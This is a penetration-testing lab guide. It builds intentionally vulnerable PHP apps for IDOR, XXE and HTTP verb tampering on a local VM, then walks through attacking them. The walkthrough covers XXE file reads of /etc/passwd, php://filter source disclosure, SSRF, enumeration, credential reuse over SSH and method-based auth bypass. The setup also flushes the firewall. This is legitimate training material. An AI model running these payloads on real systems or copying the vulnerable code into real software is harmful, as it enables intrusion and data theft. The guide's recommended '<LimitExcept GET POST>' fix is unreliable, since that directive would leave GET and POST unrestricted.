# CPTS Lab: IDOR, XXE, and HTTP Verb Tampering

## Objective

Build three vulnerable web applications on your Debian VM that demonstrate the CPTS-specific web attacks not covered on the OSCP. Practice finding and exploiting each one.

---

## Setup (Debian — 192.168.244.132)

```bash
sudo apt update
sudo apt install apache2 php libapache2-mod-php php-xml php-mysql mariadb-server -y
sudo systemctl enable --now apache2 mariadb

# Create the database for IDOR lab
sudo mysql << 'SQL'
CREATE DATABASE company;
CREATE TABLE company.employees (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(50),
    email VARCHAR(100),
    salary VARCHAR(20),
    department VARCHAR(50),
    notes TEXT
);
INSERT INTO company.employees VALUES (1,'John Smith','john@company.com','$75,000','Sales','Regular employee');
INSERT INTO company.employees VALUES (2,'Sarah Chen','sarah@company.com','$82,000','Engineering','Team lead');
INSERT INTO company.employees VALUES (3,'Admin User','admin@company.com','$150,000','IT','SSH creds: sysadmin / Adm1nSSH!');
INSERT INTO company.employees VALUES (4,'Flag User','flag@company.com','$0','SECRET','FLAG{idor_data_exposure}');
INSERT INTO company.employees VALUES (5,'Deploy Bot','deploy@company.com','$0','IT','Deploy key: D3pl0yK3y2026!');
GRANT ALL ON company.* TO 'companydb'@'localhost' IDENTIFIED BY 'companydbpass';
FLUSH PRIVILEGES;
SQL

sudo mkdir -p /var/www/html/{idor,xxe,verb}
```

### Build the IDOR vulnerable application

```bash
cat << 'PHPEOF' | sudo tee /var/www/html/idor/index.php
<?php
mysqli_report(MYSQLI_REPORT_OFF);
$conn = new mysqli("localhost","companydb","companydbpass","company");
$output = "";

if(isset($_GET['id'])) {
    $id = intval($_GET['id']);
    $r = $conn->query("SELECT id, name, email, department, notes FROM employees WHERE id=$id");
    if($r && $row = $r->fetch_assoc()) {
        $output = "<div style='background:#e8f5e9;padding:15px;margin:10px 0;border-radius:5px'>
                   <h3>{$row['name']}</h3>
                   <p>Email: {$row['email']}</p>
                   <p>Department: {$row['department']}</p>
                   <p>Notes: {$row['notes']}</p></div>";
    } else {
        $output = "<p>Employee not found.</p>";
    }
}
?>
<html><body>
<h1>Employee Portal</h1>
<p>Welcome, John Smith. <a href="?id=1">View your profile</a></p>
<hr>
<?php echo $output; ?>
<hr>
<h3>Challenges:</h3>
<ol>
    <li>View other employees' profiles by changing the ID</li>
    <li>Find the admin user's SSH credentials</li>
    <li>Find the deploy bot's key</li>
    <li>Find the flag</li>
    <li>Use ffuf to enumerate all valid employee IDs</li>
</ol>
</body></html>
PHPEOF

# IDOR API endpoint (JSON)
cat << 'PHPEOF' | sudo tee /var/www/html/idor/api.php
<?php
mysqli_report(MYSQLI_REPORT_OFF);
$conn = new mysqli("localhost","companydb","companydbpass","company");
header('Content-Type: application/json');

if(isset($_GET['employee_id'])) {
    $id = intval($_GET['employee_id']);
    $r = $conn->query("SELECT * FROM employees WHERE id=$id");
    if($r && $row = $r->fetch_assoc()) {
        echo json_encode($row);
    } else {
        echo json_encode(["error" => "Not found"]);
    }
} else {
    echo json_encode(["error" => "Missing employee_id parameter"]);
}
?>
PHPEOF
```

### Build the XXE vulnerable application

```bash
# Enable PHP XML processing
sudo phpenmod xml

cat << 'PHPEOF' | sudo tee /var/www/html/xxe/index.php
<?php
$output = "";
if($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw = file_get_contents('php://input');
    
    // Vulnerable: external entities enabled
    libxml_disable_entity_loader(false);
    $doc = new DOMDocument();
    $doc->loadXML($raw, LIBXML_NOENT | LIBXML_DTDLOAD);
    
    $name = "";
    $email = "";
    $message = "";
    
    $names = $doc->getElementsByTagName('name');
    if($names->length > 0) $name = $names->item(0)->textContent;
    $emails = $doc->getElementsByTagName('email');
    if($emails->length > 0) $email = $emails->item(0)->textContent;
    $messages = $doc->getElementsByTagName('message');
    if($messages->length > 0) $message = $messages->item(0)->textContent;
    
    $output = "<div style='background:#e3f2fd;padding:15px;margin:10px 0;border-radius:5px'>
               <h3>Submission Received</h3>
               <p>Name: $name</p>
               <p>Email: $email</p>
               <p>Message: $message</p></div>";
}
?>
<html><body>
<h1>Contact Form (XML Submission)</h1>
<p>This form accepts XML-formatted submissions.</p>

<h3>Example XML format:</h3>
<pre>
&lt;contact&gt;
  &lt;name&gt;Your Name&lt;/name&gt;
  &lt;email&gt;your@email.com&lt;/email&gt;
  &lt;message&gt;Your message here&lt;/message&gt;
&lt;/contact&gt;
</pre>

<p>Submit via: <code>curl -X POST http://TARGET/xxe/ -H "Content-Type: application/xml" -d '&lt;xml data&gt;'</code></p>

<?php echo $output; ?>

<hr>
<h3>Challenges:</h3>
<ol>
    <li>Submit a normal XML request and verify it works</li>
    <li>Read /etc/passwd using XXE</li>
    <li>Read the web application's source code</li>
    <li>Read /etc/hosts to discover internal hostnames</li>
    <li>Try to read a PHP file using php://filter base64 encoding</li>
    <li>Attempt SSRF by requesting an internal URL</li>
</ol>
</body></html>
PHPEOF

# Create a secret config file to find via XXE
echo "DB_HOST=localhost" | sudo tee /var/www/html/xxe/config.txt
echo "DB_USER=companydb" | sudo tee -a /var/www/html/xxe/config.txt
echo "DB_PASS=companydbpass" | sudo tee -a /var/www/html/xxe/config.txt
echo "SECRET_FLAG=FLAG{xxe_file_read_success}" | sudo tee -a /var/www/html/xxe/config.txt
```

### Build the HTTP Verb Tampering vulnerable application

```bash
# Create .htaccess that only restricts GET and POST
cat << 'HTEOF' | sudo tee /var/www/html/verb/.htaccess
<Limit GET POST>
    Require valid-user
</Limit>
HTEOF

# The admin page (protected by .htaccess — but only for GET and POST)
cat << 'PHPEOF' | sudo tee /var/www/html/verb/admin.php
<?php
$output = "<h2>Admin Dashboard</h2>";
$output .= "<p>Server Status: Online</p>";
$output .= "<p>Database: Connected</p>";
$output .= "<p>Admin Password: Adm1nD@shboard!</p>";
$output .= "<p>FLAG: FLAG{verb_tampering_bypass}</p>";
$output .= "<p>Internal hosts: 172.16.0.1, 172.16.0.2, 172.16.0.10</p>";
echo $output;
?>
PHPEOF

cat << 'PHPEOF' | sudo tee /var/www/html/verb/index.php
<?php
$reset_done = "";
if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['role'])) {
    $role = $_POST['role'];
    $reset_done = "<p style='color:green'>Role set to: $role</p>";
} elseif ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    // Other HTTP methods bypass the POST role check
    $data = file_get_contents('php://input');
    parse_str($data, $params);
    if(isset($params['role'])) {
        $reset_done = "<p style='color:green'>Role set to: {$params['role']} (via " . $_SERVER['REQUEST_METHOD'] . ")</p>";
    }
}
?>
<html><body>
<h1>User Management</h1>
<p><a href="admin.php">Admin Dashboard</a> (requires authentication)</p>

<h3>Set Your Role:</h3>
<form method="POST">
Role: <select name="role">
    <option value="user">User</option>
    <option value="manager">Manager</option>
    <!-- admin option removed for security -->
</select>
<button type="submit">Set Role</button>
</form>
<?php echo $reset_done; ?>

<hr>
<h3>Challenges:</h3>
<ol>
    <li>Try to access admin.php with GET — observe the 401</li>
    <li>Bypass the authentication using a different HTTP method</li>
    <li>Set your role to "admin" by bypassing the POST restriction</li>
    <li>Find the admin password and flag</li>
</ol>
</body></html>
PHPEOF

# Enable .htaccess processing
sudo a2enmod rewrite
sudo sed -i 's/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf
sudo systemctl restart apache2

sudo iptables -F && sudo iptables -P INPUT ACCEPT
echo "Setup complete."
```

---

## Attack Walkthrough: IDOR

### Step 1: Normal access

```bash
curl http://192.168.244.132/idor/?id=1
# Shows John Smith's profile — your profile
```

### Step 2: Change the ID to access other profiles

```bash
curl http://192.168.244.132/idor/?id=2
# Sarah Chen's profile — you shouldn't see this

curl http://192.168.244.132/idor/?id=3
# Admin User — contains SSH credentials: sysadmin / Adm1nSSH!

curl http://192.168.244.132/idor/?id=4
# Flag User — FLAG{idor_data_exposure}

curl http://192.168.244.132/idor/?id=5
# Deploy Bot — Deploy key: D3pl0yK3y2026!
```

**Why this works:** The application uses `?id=1` to fetch your profile but never checks that YOU are user 1. It just fetches whatever ID you provide.

### Step 3: Enumerate with ffuf

```bash
ffuf -u "http://192.168.244.132/idor/?id=FUZZ" -w <(seq 1 100) -fs 276
# -fs 276 filters out the "not found" response size
# Finds valid IDs: 1, 2, 3, 4, 5
```

### Step 4: Test the API endpoint

```bash
curl "http://192.168.244.132/idor/api.php?employee_id=3"
# Returns JSON with ALL fields including salary
# The API exposes MORE data than the web page (salary field)
# This is "Excessive Data Exposure" — another OWASP API issue
```

### Step 5: Use found credentials

```bash
ssh sysadmin@192.168.244.132
# Password: Adm1nSSH!
# IDOR → credential discovery → SSH access
```

---

## Attack Walkthrough: XXE

### Step 1: Normal XML submission

```bash
curl -X POST http://192.168.244.132/xxe/ \
  -H "Content-Type: application/xml" \
  -d '<contact><name>Test User</name><email>test@test.com</email><message>Hello</message></contact>'
# Response shows: Name: Test User, Email: test@test.com, Message: Hello
```

### Step 2: Read /etc/passwd with XXE

```bash
curl -X POST http://192.168.244.132/xxe/ \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE contact [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<contact><name>&xxe;</name><email>test@test.com</email><message>test</message></contact>'
# The "Name" field now contains the entire /etc/passwd file
```

**What happened:**
1. The `<!ENTITY xxe SYSTEM "file:///etc/passwd">` declares an entity that reads a file
2. `&xxe;` in the `<name>` tag gets replaced with the file contents
3. The application displays it as the "Name" value

### Step 3: Read the config file

```bash
curl -X POST http://192.168.244.132/xxe/ \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE contact [
  <!ENTITY xxe SYSTEM "file:///var/www/html/xxe/config.txt">
]>
<contact><name>&xxe;</name><email>test</email><message>test</message></contact>'
# Shows: DB credentials and FLAG{xxe_file_read_success}
```

### Step 4: Read PHP source code with base64

```bash
curl -X POST http://192.168.244.132/xxe/ \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE contact [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/xxe/index.php">
]>
<contact><name>&xxe;</name><email>test</email><message>test</message></contact>'
# Returns base64-encoded PHP source code
# Decode: echo "BASE64_OUTPUT" | base64 -d
```

### Step 5: SSRF — request internal services

```bash
curl -X POST http://192.168.244.132/xxe/ \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE contact [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<contact><name>&xxe;</name><email>test</email><message>test</message></contact>'
# The server makes an HTTP request to ITSELF and returns the content
# Try internal IPs: http://172.16.0.1, http://10.10.10.1, etc.
```

---

## Attack Walkthrough: HTTP Verb Tampering

### Step 1: Try accessing admin.php normally

```bash
curl http://192.168.244.132/verb/admin.php
# 401 Unauthorized — blocked

curl -X POST http://192.168.244.132/verb/admin.php
# 401 Unauthorized — also blocked
```

### Step 2: Try other HTTP methods

```bash
curl -X HEAD http://192.168.244.132/verb/admin.php -v
# Check the status code — might be 200

curl -X PUT http://192.168.244.132/verb/admin.php
# 200 OK — shows the admin dashboard!
# Admin Password: Adm1nD@shboard!
# FLAG: FLAG{verb_tampering_bypass}
# Internal hosts: 172.16.0.1, 172.16.0.2, 172.16.0.10

curl -X OPTIONS http://192.168.244.132/verb/admin.php -v
# Shows allowed methods — reveals what the server accepts

curl -X PATCH http://192.168.244.132/verb/admin.php
# Also works — any method other than GET/POST bypasses the restriction
```

**Why this works:** The `.htaccess` file uses `<Limit GET POST>` which ONLY restricts GET and POST methods. All other HTTP methods (PUT, PATCH, DELETE, HEAD, OPTIONS) are unrestricted. The correct directive would be `<LimitExcept GET POST>` which restricts everything EXCEPT the listed methods.

### Step 3: Bypass the role restriction

```bash
# POST only allows "user" or "manager" from the dropdown
curl -X POST http://192.168.244.132/verb/ -d "role=admin"
# Works but the form is designed to prevent selecting "admin"

# Use PUT to bypass any POST-specific validation
curl -X PUT http://192.168.244.132/verb/ -d "role=admin"
# Role set to: admin (via PUT) — bypassed the restriction
```

---

## Cleanup

```bash
sudo mysql -e "DROP DATABASE company; DROP USER 'companydb'@'localhost';"
sudo rm -rf /var/www/html/{idor,xxe,verb}
sudo a2dismod rewrite 2>/dev/null
sudo systemctl restart apache2
```
